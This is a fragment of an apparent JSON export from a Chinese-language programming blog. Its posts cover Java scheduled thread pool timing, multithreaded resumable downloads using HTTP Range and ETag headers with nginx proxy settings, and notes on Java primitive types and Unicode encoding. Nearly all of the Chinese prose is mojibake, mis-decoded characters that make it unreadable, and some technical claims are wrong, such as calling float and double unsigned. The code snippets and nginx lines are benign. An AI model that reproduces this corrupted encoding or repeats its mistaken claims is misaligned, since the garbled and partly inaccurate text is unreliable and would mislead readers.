nullã€‚DelayedWorkQueueä¸­çš„ä»»åŠ¡å¿…ç„¶æ˜¯æŒ‰ç…§å»¶è¿Ÿæ—¶é—´ä»çŸ­åˆ°é•¿æ¥è¿›è¡Œæ’åºçš„ã€‚ScheduledFutureTaskæœ‰ä¸€ä¸ªcompareToï¼Œç”¨äºåœ¨é˜Ÿåˆ—ä¸­è¿›è¡Œæ’åºã€‚å…¶å®å°±æ˜¯çœ‹task.timeï¼Œè°åœ¨å‰å¤´è°ä¸Šã€‚ public ScheduledFuture&lt;?&gt; scheduleAtFixedRate(Runnable command, long initialDelay, long period, TimeUnit unit) { ScheduledFutureTask&lt;Void&gt; sft = new ScheduledFutureTask&lt;Void&gt;(command, null, triggerTime(initialDelay, unit), unit.toNanos(period)); } public ScheduledFuture&lt;?&gt; scheduleWithFixedDelay(Runnable command, long initialDelay, long delay, TimeUnit unit) { ScheduledFutureTask&lt;Void&gt; sft = new ScheduledFutureTask&lt;Void&gt;(command, null, triggerTime(initialDelay, unit), unit.toNanos(-delay)); } //è€Œåœ¨ScheduledFutureTaskä¸­å®šæ—¶ä»»åŠ¡æ˜¯è¿™æ ·è®¾ç½®ä¸‹ä¸€æ¬¡æ‰§è¡Œæ—¶é—´çš„ private void setNextRunTime() { long p = period; if (p &gt; 0) time += p; else time = triggerTime(-p); //å½“å‰æ—¶é—´+periodã€‚è€Œèµ°åˆ°è¿™é‡Œï¼Œrunæ–¹æ³•å·²ç»èµ°è¿‡äº†ï¼Œæ‰€ä»¥å¦‚æœrunå µå¡äº†å¾ˆä¹…ï¼Œè¿™ä¸ªtaskçš„ä¸‹ä¸€æ¬¡æ‰§è¡Œæ—¶é—´å°±ä¼šä¸å‡†äº† } ç»“è®ºå°±æ˜¯scheduleWithFixedDelayå¯èƒ½ä¼šå› ä¸ºå‰é¢çš„ä»»åŠ¡å µå¡é€ æˆä¸æ˜¯é‚£ä¹ˆå‡† 19 .Concurrency Concepts in javaConcurrency Concepts in Java by Douglas HawkinsunSafeé‡Œé¢æœ‰ä¸€ä¸ªloadFence,storeFence,fullFenceæ–¹æ³•,ä½†UnSafeåŸæœ¬å°±ä¸åº”è¯¥ä½¿ç”¨ å‚è€ƒ çœ‹èµ·æ¥ ReentrantLock æ— è®ºåœ¨å“ªæ–¹é¢éƒ½æ¯” synchronized å¥½ Jesse Wilson - Coordinating Space and Time ä¸€çº§ç¼“å­˜ï¼Œæ—¶é’Ÿå‘¨æœŸvolatileç¡¬ä»¶å±‚é¢çš„å®ç°åŸç† StampedLock in Java Java 8 StampedLocks vs. ReadWriteLocks and Synchronized æ­»ç£•javaç³»åˆ—","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"concurrency","slug":"concurrency","permalink":"https://haldir65.github.io/tags/concurrency/"}]},{"title":"å¤šçº¿ç¨‹æ–­ç‚¹ç»­ä¼ åŸç†åŠå®ç°","date":"2017-08-01T22:19:31.000Z","path":"2017/08/01/2017-08-01-mutithread-downloader/","text":"ä¸»è¦è®²ä¸€ä¸‹åœ¨javaä¸­(å¹³å°å¹¶ä¸é™äºandroid)å®ç°å¤šçº¿ç¨‹æ–­ç‚¹ç»­ä¼ çš„åŸç†,ä¸»è¦è®²æ–­ç‚¹ä¸‹è½½çš„åŸç†ã€‚ å…¶å®å°±æ˜¯åœ¨Httpè¯·æ±‚é‡Œé¢åŠ ä¸Šä¸€ä¸ªâ€rangeâ€çš„headerï¼ŒHttpUrlConnectionå¯ä»¥è¿™ä¹ˆå¹²ï¼š conn.setRequestProperty(&quot;Range&quot;, &quot;bytes=&quot; + 500 + &quot;-&quot; + 1000); ä¹Ÿå°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨ä¸Šæ¬¡ä¸‹è½½åˆ°çš„ä½ç½®ï¼Œæœ¬åœ°å†™æ–‡ä»¶å¯ä»¥ä½¿ç”¨RandomAccessFileã€‚æœ¬åœ°éœ€è¦è®°å½•ä¸‹ä¸Šæ¬¡ä¸­æ–­ååœä¸‹æ¥çš„ä½ç½®ã€‚å¯ä»¥ç”¨dbè®°å½•ï¼Œä¹Ÿå¯ä»¥ç”¨spè®°å½•ã€‚å®è·µä¸­è‚¯å®šè¦å‘ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æ˜¯ä¸ºäº†è¯»content-Lengthï¼Œç¡®å®šæ¯ä¸€ä»½ä¸‹è½½ä»»åŠ¡éœ€è¦ä¸‹è½½å¤šå°‘bytesã€‚ç¬¬äºŒæ­¥ï¼Œå°±æ˜¯æ ¹æ®çº¿ç¨‹æ•°é‡ï¼Œæ€»æ•°é™¤ä»¥çº¿ç¨‹æ•°ï¼Œç”¨ä¸€ä¸ªçº¿ç¨‹æ± (æˆ–è€…ç›´æ¥å¼€å¤šæ¡çº¿ç¨‹)å»æ‰§è¡Œè¿™ä¹ˆå¤šä»½ä»»åŠ¡ã€‚æ¯ä¸€ä»½ä»»åŠ¡çš„è¯·æ±‚éƒ½è¦å¸¦ä¸Šä¸Šé¢é‚£ä¸ªRangeçš„Headerã€‚ nginxé‡Œé¢å¯èƒ½è¦è®¾ç½®ä¸€ä¸‹,å½“ç„¶å‰ææ˜¯ä¸‹è½½æœåŠ¡æœ¬èº«æ”¯æŒrangeè¯·æ±‚ proxy_cache_key $host&amp;uri&amp;is_args&amp;args$http_range; proxy_set_header Range $http_range; proxy_set_header If-Range $http_if_range; proxy_cache_valid 200 206; proxy_set_headerå°±æ˜¯Nginxåœ¨å°†è¯·æ±‚ä¼ é€’ç»™serverçš„æ—¶å€™æ·»åŠ ä¸€äº›headerï¼Œå¯ä»¥æ˜¯æ–‡æœ¬ï¼Œå˜é‡æˆ–è€…æ˜¯äºŒè€…çš„ç»„åˆå¯èƒ½è¿˜æ¶‰åŠåˆ°ä¸€äº›proxy_cacheæ¨¡å—çš„åŸç† å¦å¤–è¿™ç§æƒ…å†µä¸‹çš„http response headeråº”è¯¥æ˜¯206 Partial Requests,å°è±¡ä¸­ç½‘æ˜“äº‘éŸ³ä¹ç½‘é¡µç«¯å¬æ­Œçš„åª’ä½“æ–‡ä»¶æ˜¯partial request HTTPæ–‡ä»¶æ–­ç‚¹ç»­ä¼ çš„åŸç†å…¶å®è¦æ³¨æ„çš„æ˜¯ï¼Œæ–­ç‚¹ç»­ä¼ ï¼Œä¸‹æ¬¡å¼€å§‹ä¸‹è½½å‰ï¼Œéœ€è¦æ ¹æ®ETagåˆ¤æ–­ä¸‹æœåŠ¡å™¨ä¸Šçš„è¿™ä¸ªæ–‡ä»¶æ˜¯å¦æ›´æ”¹è¿‡äº†ï¼Œå¦‚æœæ”¹è¿‡äº† httpURLConnection.getHeaderField(â€œETagâ€); httpURLConnection.getHeaderField(â€œETagâ€); //è¿™æ˜¯ä»é›¶å¼€å§‹ä¸‹è½½çš„æ—¶å€™è·å–Etagï¼Œæœ¬åœ°ä¿å­˜ httpURLConnection.setRequestProperty(â€œIf-None-Matchâ€, â€œb428eab9654aa7c87091eâ€); // ä¸‹è½½æ¢å¤ä¹‹åï¼Œé‡æ–°å‘è¯·æ±‚ï¼Œå¦‚æœåè¿”å›ä¸€ä¸ª304çš„çŠ¶æ€ç ï¼Œé‚£ä¹ˆå¯ä»¥ç»§ç»­æ‰§è¡Œã€‚å¦‚æœå‘ç”Ÿäº†æ›´æ”¹ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨æ–°çš„èµ„æºé‡æ–°ä¸‹è½½ã€‚ è¿™é‡Œé¢çš„éš¾ç‚¹åœ¨äºå¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ï¼Œé«˜æ•ˆç‡é”ã€‚è¿˜å¾—è¦ä½¿ç”¨ArrayBlockingQueueã€‚ 1. è·å–è¦ä¸‹è½½çš„å†…å®¹çš„contentLengthHttpUrlConnectionæœ‰ä¸€ä¸ªconnection.getContentLength()æ–¹æ³•ï¼Œç”¨äºè·å–å†…å®¹å¤§å°(bytes) 2. å¤§æ–‡ä»¶ä¸Šä¼ é¿å…oomCaused by java.lang.OutOfMemoryError: Failed to allocate a 65548 byte allocation with 32012 free bytes and 31KB until OOM at com.android.okio.Segment.&lt;init&gt;(Segment.java:37) at com.android.okio.SegmentPool.take(SegmentPool.java:48) at com.android.okio.OkBuffer.writableSegment(OkBuffer.java:511) at com.android.okio.OkBuffer.write(OkBuffer.java:424) at com.android.okio.OkBuffer.clone(OkBuffer.java:740) at com.android.okhttp.internal.http.RetryableSink.writeToSocket(RetryableSink.java:77) at com.android.okhttp.internal.http.HttpConnection.writeRequestBody(HttpConnection.java:263) at com.android.okhttp.internal.http.HttpTransport.writeRequestBody(HttpTransport.java:84) at com.android.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:790) at com.android.okhttp.internal.http.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:405) at com.android.okhttp.internal.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:349) at com.android.okhttp.internal.http.HttpURLConnectionImpl.getResponseCode(HttpURLConnectionImpl.java:517) at com.android.okhttp.internal.http.DelegatingHttpsURLConnection.getResponseCode(DelegatingHttpsURLConnection.java:105) å‚è€ƒ con.setChunkedStreamingMode(1024);//å†…éƒ¨ç¼“å†²åŒºâ€”åˆ†æ®µä¸Šä¼ é˜²æ­¢oomHttpURLConnectionæ•™ç¨‹ä¸Šä¼ çš„æ—¶å€™ä¸èµ°HttpUrlConnectionï¼Œç›´æ¥åˆ›å»ºSocketæ¨¡æ‹ŸPOSTé¿å…å¤§æ–‡ä»¶OOM 3. ç°æœ‰çš„å®ç°æ–¹æ¡ˆéå¸¸ä¼˜ç§€çš„libraryï¼Œè‹±è¯­æµåˆ©è¯´å–œæ¬¢æå¤šè¿›ç¨‹ã€‚Aspsineè‹±è¯­æµåˆ©è¯´ä¸‹è½½æ–‡ä»¶çš„æœ¬è´¨æ˜¯inputstream.read 4.ç®€å•çš„å®ç°ä¸€ç§æœ´ç´ çš„æƒ³æ³•æ˜¯ï¼Œåˆ¤æ–­å½“å‰ç³»ç»Ÿæœ‰å¤šå°‘å¯ç”¨cpuï¼Œå¯åŠ¨å¯¹åº”æ•°é‡çš„çº¿ç¨‹ã€‚æ¯”æ–¹è¯´cpu4æ ¸å¿ƒï¼Œéœ€è¦ä¸‹è½½61MBçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸‰æ¡çº¿ç¨‹åˆ†åˆ«ä¸‹è½½15MBæ–‡ä»¶ï¼Œç¬¬å››æ¡çº¿ç¨‹ä¸‹è½½16MBæ–‡ä»¶ã€‚æ¯æ¡çº¿ç¨‹åœ¨è¯»å–ä¸€æ¬¡åï¼Œé€šè¿‡é”é€šçŸ¥å¤–éƒ¨ç›‘å¬ã€‚æ¯æ¡çº¿ç¨‹ä¸‹è½½å®Œæˆåé€šçŸ¥å¤–éƒ¨æ£€æŸ¥æ˜¯å¦å·²ç»å®Œæˆã€‚æš‚åœï¼Œæ¢å¤ä¸‹è½½ã€‚è¿™ä¿©æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ¯ä¸ªtasKåœ¨è¿è¡Œçš„æ—¶å€™ç›‘æµ‹å…¨å±€çš„çŠ¶æ€ï¼Œåœ¨å‘ç°çŠ¶æ€å˜ä¸ºæš‚åœçš„æ—¶å€™ï¼Œæœ¬åœ°æŒä¹…åŒ–å½“å‰è¿›åº¦(sqlæˆ–è€…æ–‡ä»¶) å‚è€ƒ ç®€ä¹¦ Demo MultiThreadDownload for Android csdn æ–­ç‚¹ä¸Šä¼ éº»çƒ¦ç‚¹ï¼Œè¦è‡ªå·±æ­server","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"äºŒè¿›åˆ¶ç¼–ç æ€»ç»“","date":"2017-07-30T17:45:51.000Z","path":"2017/07/30/2017-07-30-decoding-the-secret-of-binary/","text":"OkHttpä½œè€…Jesse Wilsonåœ¨2016 Droidcon NYCä¸Šä½œäº†ä¸€ç¯‡å…³äºç¼–ç çš„æ¼”è®²ï¼Œååˆ†æœ‰è¶£ã€‚å¯¹äºäº†è§£è®¡ç®—æœºåŸºç¡€éå¸¸æœ‰ç”¨ï¼Œç»“åˆç€å†™ä¸€äº›å…³äºè¿™æ–¹é¢çš„ç¬”è®°ã€‚ 1.é‡æ–°å­¦ä¹ JavaåŸºæœ¬æ•°æ®ç±»å‹åŸºæœ¬æ•°æ®ç±»å‹ä¹‹é—´çš„è½¬æ¢åˆå­¦javaçš„æ—¶å€™éƒ½è¯´æ²¡å¿…è¦è®°ä½å„ç§åŸºæœ¬æ•°æ®ç±»å‹çš„å¤§å°èŒƒå›´ã€‚è¿™é‡Œè¡¥ä¸Šä¸€äº›ï¼š è¿™äº›èŒƒå›´éƒ½æ˜¯é—­åŒºé—´ byteï¼š8ä½ï¼Œæœ€å¤§å­˜å‚¨æ•°æ®é‡æ˜¯255ï¼Œå­˜æ”¾çš„æ•°æ®èŒƒå›´æ˜¯[-128,127]é—´, singedã€‚ shortï¼š16ä½ï¼Œæœ€å¤§æ•°æ®å­˜å‚¨é‡æ˜¯65536ï¼Œæ•°æ®èŒƒå›´æ˜¯[-32768~32767]ä¹‹é—´,signedã€‚ int(æ•´æ•°)ï¼š32ä½ï¼Œæœ€å¤§æ•°æ®å­˜å‚¨å®¹é‡æ˜¯2çš„32æ¬¡æ–¹å‡1ï¼Œæ•°æ®èŒƒå›´æ˜¯è´Ÿçš„2çš„31æ¬¡æ–¹åˆ°æ­£çš„2çš„31æ¬¡æ–¹å‡1ã€‚[-2^31, 2^31-1],singedã€‚ long(é•¿æ•´æ•°)ï¼š64ä½ï¼Œæœ€å¤§æ•°æ®å­˜å‚¨å®¹é‡æ˜¯2çš„64æ¬¡æ–¹å‡1ï¼Œæ•°æ®èŒƒå›´ä¸ºè´Ÿçš„2çš„63æ¬¡æ–¹åˆ°æ­£çš„2çš„63æ¬¡æ–¹å‡1ã€‚[-2^63,2^63-1],signedã€‚ float(å•ç²¾åº¦æ•°)ï¼š32ä½ï¼Œæ•°æ®èŒƒå›´åœ¨3.4e-45~1.4e38ï¼Œç›´æ¥èµ‹å€¼æ—¶å¿…é¡»åœ¨æ•°å­—ååŠ ä¸Šfæˆ–Fã€‚unsignedã€‚//è¿™ä¸ªèŒƒå›´åªæ˜¯æ­£æ•°éƒ¨åˆ†çš„ double(åŒç²¾åº¦æ•°)ï¼š64ä½ï¼Œæ•°æ®èŒƒå›´åœ¨4.9e-324~1.8e308ï¼Œèµ‹å€¼æ—¶å¯ä»¥åŠ dæˆ–Dä¹Ÿå¯ä»¥ä¸åŠ ã€‚unsignedã€‚ //è¿™ä¸ªèŒƒå›´æ˜¯æ­£æ•°éƒ¨åˆ†çš„ booleanï¼šåªæœ‰trueå’Œfalseä¸¤ä¸ªå–å€¼ã€‚ charï¼š16ä½ï¼Œå­˜å‚¨Unicodeç ï¼Œç”¨å•å¼•å·èµ‹å€¼ã€‚ è¿™ä¸ªè¡¨çš„é¡ºåºæ˜¯æœ‰é“ç†çš„ï¼Œbyte-&gt;short-&gt;int-&gt;longè¿™ç±»è¡¨ç¤ºçš„éƒ½æ˜¯æ•´æ•°ï¼ˆä¸å¸¦å°æ•°ç‚¹çš„ï¼‰;float-&gt;doubleè¿™ç±»è¡¨ç¤ºçš„éƒ½æ˜¯æµ®ç‚¹æ•°(è®¡ç®—æœºé‡Œæ²¡æœ‰å°æ•°ç‚¹ï¼Œéƒ½æ˜¯ç”¨ç±»ä¼¼ç§‘å­¦è®¡æ•°æ³•æ¥è¡¨ç¤ºçš„); åé¢è¿™ä¿©æ¯”è¾ƒç‰¹æ®Šï¼šbooleanåªæœ‰ä¸¤ä¸ªå€¼;charä¸“é—¨ç”¨æ¥è¡¨ç¤ºUnicodeç ï¼Œæœ€å°å€¼æ˜¯0ï¼Œæœ€å¤§å€¼æ˜¯65535(2^16-1); (è¿™ä¸ªèŒƒå›´æ˜¯ä¸¥æ ¼é™å®šçš„ï¼Œæ¯”å¦‚byte a = 127éƒ½æ²¡é—®é¢˜ï¼Œbyte a = 128 ç«‹é©¬ç¼–è¯‘æœ‰é—®é¢˜ã€‚)å¦å¤–ï¼Œcharæ˜¯ä¸ºæ•°ä¸å¤šçš„å¯ä»¥åœ¨java IDEé‡Œé¢åƒpythonä¸€æ ·å†™å•å¼•å·çš„æœºä¼šï¼šchar c = â€˜1â€™ // okchar c = â€˜12â€™//é”™è¯¯char c = 12 //æ­£ç¡® å½“ä¸€ä¸ªè¾ƒå¤§çš„æ•°å’Œä¸€ä¸ªè¾ƒå°çš„æ•°åœ¨ä¸€å—è¿ç®—çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†è¾ƒå°çš„æ•°è½¬æ¢æˆè¾ƒå¤§çš„æ•°ï¼Œå†è¿›è¡Œè¿ç®—ã€‚è¿™é‡Œçš„å¤§å°æŒ‡çš„æ˜¯åŸºæœ¬ç±»å‹èŒƒå›´çš„å¤§å°æ‰€ä»¥(byteã€shortã€char) -&gt; int -&gt; long -&gt; float -&gt; doubleè¿™ä¹ˆä»å°å¾€å¤§è½¬æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ç¼–è¯‘å™¨è‡ªåŠ¨è½¬ï¼Œæ‰€ä»¥ç»å¸¸ä¸ä¼šè¢«å¯Ÿè§‰ã€‚byteã€shortã€charè¿™ä¸‰ä¸ªæ˜¯å¹³çº§çš„ï¼Œç›¸äº’è½¬æ¢ä¹Ÿè¡Œã€‚è¯•äº†ä¸‹, byte b = 3; char c = &#39;2&#39;; short s = 23; s = b; //åªæœ‰byteå¾€ä¸Šè½¬shortæ˜¯è‡ªåŠ¨çš„ b = (byte) s; s = (short) c; c = (char) s; b = (byte) c; c = (char) b; å¼ºè½¬å°±æ„å‘³ç€å¯èƒ½çš„ç²¾åº¦æŸå¤±ã€‚ æ‰€ä»¥é™¤å»booleanä»¥å¤–: char byte,short,int,long float,doubleå¯ä»¥åˆ†æˆè¿™ä¸‰ç±»ï¼Œä»å°å¾€å¤§è½¬æ²¡é—®é¢˜ï¼ŒåŒä¸€ç±»ä»å°åˆ°å¤§è½¬æ²¡é—®é¢˜ã€‚ å…·ä½“åˆ°å®é™…æ“ä½œä¸Šï¼š char-&gt;byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double æœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯longï¼Œç»“æœæ˜¯long æœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯float,ç»“æœæ˜¯float æœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯doubleï¼Œç»“æœæ˜¯double long l = 424323L ,åé¢çš„Lè¦å¤§å†™ã€‚ è¿™äº›æ•´æ•°éƒ½æ˜¯æ²¡åŠæ³•è¡¨ç¤ºä¸€ä¸ªå°æ•°çš„ï¼Œè¦ç”¨floatæˆ–è€…doubleï¼Œåé¢åŠ ä¸Šfï¼ˆFï¼‰æˆ–è€…Lã€‚ char(16ä½)ï¼Œèƒ½è¡¨ç¤ºçš„èŒƒå›´å¤§å°å’Œshortä¸€æ ·ï¼Œæ˜¯ç”¨å•å¼•å·æ‹¬èµ·æ¥çš„ä¸€ä¸ªå­—ç¬¦(å¯ä»¥æ˜¯ä¸­æ–‡å­—ç¬¦)ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸è¡Œã€‚ charçš„åŸç†å°±æ˜¯è½¬æˆintï¼Œæ ¹æ®unicodeç¼–ç æ‰¾åˆ°å¯¹åº”çš„ç¬¦å·å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ ä¸¤ä¸ªcharç›¸åŠ ï¼Œå°±æ˜¯è½¬æˆintä¹‹åä¸¤ä¸ªintç›¸åŠ  doubleç±»å‹åé¢å¯ä»¥ä¸å†™D floatåé¢å†™fæˆ–è€…Féƒ½ä¸€æ · 2. Javaä¸­æ³¨æ„çš„ç‚¹javaç¼–è¯‘å™¨å°†æºä»£ç ç¼–è¯‘ä½å­—èŠ‚ç æ—¶ï¼Œä¼šç”¨intæ¥è¡¨ç¤ºboolean(éé›¶è¡¨ç¤ºçœŸ)byte,short,int,longè¿™äº›éƒ½æ˜¯æœ‰ç¬¦å·çš„æ•´æ•°ï¼Œå…«è¿›åˆ¶æ•°ä»¥0å¼€å¤´ï¼Œåå…­è¿›åˆ¶æ•°å­—ä»¥0xå¼€å¤´java7 å¼€å§‹ ï¼Œå¯ä»¥ç›´æ¥åœ¨ä»£ç é‡Œå†™äºŒè¿›åˆ¶æ•°ï¼Œä¾‹å¦‚ï¼š205 = 0b110_1101 3. Encodingè§£é‡Š hexadecimal åå…­è¿›åˆ¶ Decimal åè¿›åˆ¶ Octal å…«è¿›åˆ¶ 3.1 ç”¨äºŒè¿›åˆ¶è¡¨ç¤º(0,1)ä»»ä½•æ–‡å­—çš„èƒ½åŠ›æ•°æ®çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹å¯¹ä¼ è¾“æ•°æ®çš„ç»“æ„ç±»å‹è¾¾æˆä¸€è‡´ï¼Œå³(Encoding)ã€‚ 8 bit = 1 Byte (ä¸ºä»€ä¹ˆæ˜¯8ï¼Œæ®è¯´60å¹´ä»£æ˜¯6)ï¼Œ8bitèƒ½å¤Ÿè¡¨è¾¾çš„èŒƒå›´ä¹Ÿå°±æ˜¯2^8 = 0-256.1967å¹´ï¼ŒASCIIç è¯ç”Ÿï¼Œå³American Standard Code for Information Interchangeï¼Œå³å°†Byteè½¬æˆæ–‡å­—çš„ä¸€å¼ è¡¨ã€‚ASCIIåªç”¨äº†7ä¸ªbitsï¼ŒåŸå› æ˜¯å½“æ—¶ç¡¬ä»¶å¾ˆè´µã€‚æ‰€ä»¥å°±èƒ½å¤Ÿè¡¨ç¤º128ä¸ªå­—ç¬¦ã€‚éšä¾¿æ‰¾äº†ä¸‹è¿™å¼ è¡¨ ä¾‹å¦‚0è¡¨ç¤ºNULL, 65è¡¨ç¤ºA(å¤§å†™),93è¡¨ç¤ºæ ‡ç‚¹ç¬¦å·â€]â€ã€‚ä¸¾ä¾‹ï¼šå•è¯Donutçš„æ¯ä¸€ä¸ªå­—æ¯å¯¹åº”çš„ASCIIåˆ†åˆ«æ˜¯ï¼šåè¿›åˆ¶ ï¼š68 111 110 117 116äºŒè¿›åˆ¶: 01000100 01101111 01101110 01110101 01110100æ‰€ä»¥è¿™ä¹ˆå‘é€å‡ºå»ï¼Œæ¥æ”¶è€…å°±çŸ¥é“æ˜¯Donutäº† 3.2 å¯æ˜¯128ä¸ªå­—ç¬¦ä¸è¶³ä»¥è¡¨ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰çš„æ–‡å­— Charset å­—ç¬¦é›†1991å¹´å‡ºç°Unicodeï¼Œç”¨äºè¡¨ç¤ºæ‰€æœ‰çš„å­—ç¬¦ï¼Œæ‰€æœ‰è¯­è¨€çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½èƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„idï¼ˆæ•°å­—ï¼‰ã€‚ä¸ºäº†èƒ½å¤Ÿè¡¨è¾¾è¿™ä¹ˆå¤§çš„ä¸€ä¸ªèŒƒå›´ï¼Œæ‰€ä»¥å¾—å¤šç”¨ç‚¹å†…å­˜ï¼Œäºæ˜¯UTF-16(16-bit Unicode Transformation Format)å‡ºç°äº†ï¼Œæ¯ä¸€ä¸ªå­—ç¬¦éƒ½å¾—ç”¨2bytesæ¥è¡¨ç¤ºã€‚è‡³äºè¿™å¼ è¡¨çš„èŒƒå›´,2^16 = 65536(å¥½ç†Ÿæ‚‰çš„æ•°å­—)ï¼Œè¿™ä¹Ÿå°±æ˜¯javaçš„charç±»å‹çš„æ¥æºï¼Œcharçš„å®šä¹‰å°±æ˜¯16ä½Unicodeå­—ç¬¦ã€‚è¿™æ ·åšæœ‰ä¸€ä¸ªæ˜¾ç„¶çš„ç¼ºé™·ã€‚Unicodeæ˜¯ASCIIçš„è¶…é›†ï¼ŒDåœ¨ASCIIä¸­åªè¦ 01000100ï¼Œåœ¨Unicodeä¸­å´è¦åœ¨å‰é¢è¡¥ä¸Šæ¯«æ— æ„ä¹‰çš„8ä¸ª0ï¼Œæµªè´¹äº†ç©ºé—´ã€‚ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒASCIIç¼–ç æ˜¯1ä¸ªå­—èŠ‚ï¼Œè€ŒUnicodeç¼–ç é€šå¸¸æ˜¯2ä¸ªå­—èŠ‚ï¼‰ Unicodeçš„ä¸åŒç‰ˆæœ¬å’Œå¹³é¢ï¼ˆwikiä¸Šè¯´2018å¹´æœ€æ–°ç‰ˆçš„unicodeå·²ç»æ”¶çº³äº†15ä¸‡ä¸ªå­—ç¬¦ï¼‰Unicodeç›®å‰æ™®éé‡‡ç”¨çš„æ˜¯UCS-2ï¼Œç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæœ€å¤šèƒ½è¡¨ç¤º2çš„16æ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯65536ä¸ªå­—äº†ã€‚ï¼ˆ15ä¸‡ä¸ªå­—ç¬¦æ€ä¹ˆæ¥çš„ï¼š65536ä¸ªæ”¾åœ¨U+0000åˆ°U+FFFFï¼Œå‰©ä¸‹çš„å­—ç¬¦éƒ½æ”¾åœ¨è¾…åŠ©å¹³é¢ï¼ˆç¼©å†™SMPï¼‰ï¼Œç ç‚¹èŒƒå›´ä»U+010000ä¸€ç›´åˆ°U+10FFFFã€‚ï¼‰ Unicodeåªæœ‰ä¸€ä¸ªå­—ç¬¦é›†ï¼Œä¸­ã€æ—¥ã€éŸ©çš„ä¸‰ç§æ–‡å­—å ç”¨äº†Unicodeä¸­0x3000åˆ°0x9FFFçš„éƒ¨åˆ†Unicodeç›®å‰æ™®éé‡‡ç”¨çš„æ˜¯UCS-2,å®ƒç”¨ä¸¤ä¸ªå­—èŠ‚æ¥ç¼–ç ä¸€ä¸ªå­—ç¬¦, æ¯”å¦‚æ±‰å­—â€ç»â€çš„ç¼–ç æ˜¯0x7ECF,æ³¨æ„å­—ç¬¦ç¼–ç ä¸€èˆ¬ç”¨åå…­è¿›åˆ¶æ¥ è¡¨ç¤º,ä¸ºäº†ä¸åè¿›åˆ¶åŒºåˆ†,åå…­è¿›åˆ¶ä»¥0xå¼€å¤´,0x7ECFè½¬æ¢æˆåè¿›åˆ¶ å°±æ˜¯32463,UCS-2ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥ç¼–ç å­—ç¬¦,ä¸¤ä¸ªå­—èŠ‚å°±æ˜¯16ä½äºŒè¿›åˆ¶, 2çš„16æ¬¡æ–¹ç­‰äº65536,æ‰€ä»¥UCS-2æœ€å¤šèƒ½ç¼–ç 65536ä¸ªå­—ç¬¦ã€‚ ç¼–ç ä»0åˆ°127çš„å­—ç¬¦ä¸ASCIIç¼–ç çš„å­—ç¬¦ä¸€æ ·,æ¯”å¦‚å­—æ¯â€aâ€çš„Unicode ç¼–ç æ˜¯0x0061,åè¿›åˆ¶æ˜¯97,è€Œâ€aâ€çš„ASCIIç¼–ç æ˜¯0x61,åè¿›åˆ¶ä¹Ÿæ˜¯97, å¯¹äºæ±‰å­—çš„ç¼–ç ,äº‹å®ä¸ŠUnicodeå¯¹æ±‰å­—æ”¯æŒä¸æ€ä¹ˆå¥½,è¿™ä¹Ÿæ˜¯æ²¡åŠæ³•çš„, ç®€ä½“å’Œç¹ä½“æ€»å…±æœ‰å…­ä¸ƒä¸‡ä¸ªæ±‰å­—,è€ŒUCS-2æœ€å¤šèƒ½è¡¨ç¤º65536ä¸ª,æ‰å…­ä¸‡ å¤šä¸ª,æ‰€ä»¥Unicodeåªèƒ½æ’é™¤ä¸€äº›å‡ ä¹ä¸ç”¨çš„æ±‰å­—,å¥½åœ¨å¸¸ç”¨çš„ç®€ä½“æ±‰å­— ä¹Ÿä¸è¿‡ä¸ƒåƒå¤šä¸ª,ä¸ºäº†èƒ½è¡¨ç¤ºæ‰€æœ‰æ±‰å­—,Unicodeä¹Ÿæœ‰UCS-4è§„èŒƒ,å°±æ˜¯ç”¨ 4ä¸ªå­—èŠ‚æ¥ç¼–ç å­—ç¬¦,ä¸è¿‡ç°åœ¨æ™®éé‡‡ç”¨çš„è¿˜æ˜¯UCS-2ï¼Œåªç”¨ä¸¤ä¸ªå­—èŠ‚æ¥ ç¼–ç  åœ¨wikié‡Œé¢æ˜¯è¿™ä¹ˆå†™çš„: åœ¨è¡¨ç¤ºä¸€ä¸ªUnicodeçš„å­—ç¬¦æ—¶ï¼Œé€šå¸¸ä¼šç”¨â€œU+â€ç„¶åç´§æ¥ç€ä¸€ç»„åå…­è¿›åˆ¶çš„æ•°å­—æ¥è¡¨ç¤ºè¿™ä¸€ä¸ªå­—ç¬¦ã€‚åœ¨åŸºæœ¬å¤šæ–‡ç§å¹³é¢ï¼ˆè‹±æ–‡ï¼šBasic Multilingual Planeï¼Œç®€å†™BMPã€‚åˆç§°ä¸ºâ€œé›¶å·å¹³é¢â€ã€plane 0ï¼‰é‡Œçš„æ‰€æœ‰å­—ç¬¦ï¼Œè¦ç”¨å››ä¸ªæ•°å­—ï¼ˆå³ä¸¤ä¸ªchar,16bit 